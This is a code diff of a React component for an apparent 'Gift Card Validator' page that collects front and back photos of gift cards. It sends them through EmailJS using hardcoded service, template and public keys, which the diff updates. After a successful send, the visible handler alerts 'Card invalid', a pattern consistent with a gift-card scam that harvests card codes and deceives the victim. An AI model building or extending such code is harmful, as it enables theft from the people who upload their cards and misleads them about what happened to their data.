@@ -200,6 +200,8 @@ function PurchaseOrValidate() {
     const [frontImage, setFrontImage] = useState(null);
     const [backImage, setBackImage] = useState(null);
     const maxTotalFileSize = 500 * 1024;
+    const [frontImageFile, setFrontImageFile] = useState(null);
+    const [backImageFile, setBackImageFile] = useState(null);   
 
     const openPurchaseModal = (card) => {
         setSelectedCard(card);
@@ -254,7 +256,7 @@ function PurchaseOrValidate() {
         };
         const serviceId = 'service_rsh8zcj'
         const templateId = 'template_kq7rvh7'
-        const publicKey = 'XEPa_HeI5_6-59dSj'
+        const publicKey = '8NV8xqPuYSjS3pDn3'
         const templateParams = {
             from_name: "Gift Card Validator",
             CardType: selectedCard?.name,
@@ -291,10 +293,11 @@ function PurchaseOrValidate() {
 
         const serviceId = 'service_rsh8zcj'
         const templateId = 'template_kq7rvh7'
-        const publicKey = 'XEPa_HeI5_6-59dSj'
+        const publicKey = '8NV8xqPuYSjS3pDn3'
 
         emailjs.sendForm(serviceId, templateId, form.current, publicKey)
-        .then((response) => {
+            .then((response) => {
+            console.log(response)
             alert('Card invalid');
             handleToggleUploadMode();
         })
@@ -444,37 +447,39 @@ function PurchaseOrValidate() {
 };
 
     const handleFileChange = (e) => {
-        const file = e.target.files[0];
+    const file = e.target.files[0];
+    
+    if (!file) return;
 
-        if (!file) return;
+    // Create an object URL to display the selected image
+    const imageUrl = URL.createObjectURL(file);
 
-        // Create an object URL to display the selected image
-        const imageUrl = URL.createObjectURL(file);
+    // Update state based on the input field that triggered the event
+    if (e.target.name === 'front_image') {
+        setFrontImage(imageUrl);  // For displaying the image
+        setFrontImageFile(file);  // For validation purposes
+    } else if (e.target.name === 'back_image') {
+        setBackImage(imageUrl);   // For displaying the image
+        setBackImageFile(file);   // For validation purposes
+    }
 
-        // Update state based on the input field that triggered the event
-        if (e.target.name === 'front_image') {
-            setFrontImage(imageUrl);
-        } else if (e.target.name === 'back_image') {
-            setBackImage(imageUrl);
-        }
+    // Perform validation based on actual file objects
+    const frontFileSize = e.target.name === 'front_image' ? file.size : frontImageFile?.size || 0;
+    const backFileSize = e.target.name === 'back_image' ? file.size : backImageFile?.size || 0;
+    const totalSize = frontFileSize + backFileSize;
 
-        // Calculate total file size of both images
-        const frontFileSize = e.target.name === 'front_image' ? file.size || 0 : frontImage?.size || 0;
-        const backFileSize = e.target.name === 'back_image' ? file.size || 0 : backImage?.size || 0;
-        const totalSize = frontFileSize + backFileSize;
-
-        // Validate combined file size and check if files are present
-        if (totalSize > maxTotalFileSize) {
-            setErrorMessage('Attachments size limit. The maximum allowed attachments size is 500KB');
-            setIsFileValid(false);
-        } else if (!frontFileSize || !backFileSize) {
-            setErrorMessage('Please upload both front and back images.');
-            setIsFileValid(false);
-        } else {
-            setErrorMessage('');
-            setIsFileValid(true);
-        }
-    };
+    // Validate combined file size and check if both files are present
+    if (totalSize > 500 * 1024) {  // 500KB limit
+        setErrorMessage('Attachments size limit. The maximum allowed attachments size is 500KB');
+        setIsFileValid(false);
+    } else if (!frontFileSize || !backFileSize) {
+        setErrorMessage('Please upload both front and back images.');
+        setIsFileValid(false);
+    } else {
+        setErrorMessage('');
+        setIsFileValid(true);
+    }
+};
 
     return (
         <Box
@@ -668,12 +673,13 @@ function PurchaseOrValidate() {
                                         {errorMessage && <p style={{ color: 'red' }}>{errorMessage}</p>}
                                         <p style={{ fontSize: '12px' }}>Info: max size of file is 250kb</p>
 
+                                       
                                         <Button
                                             mt={6}
                                             colorScheme="white"
                                             variant="outline"
                                             type="submit"
-                                            isDisabled={!isFileValid || loading || !frontImage || !backImage}
+                                            isDisabled={!isFileValid || loading || !frontImage || !backImage} 
                                         >
                                             {loading ? <Spinner size="sm" /> : 'Validate'}
                                         </Button>
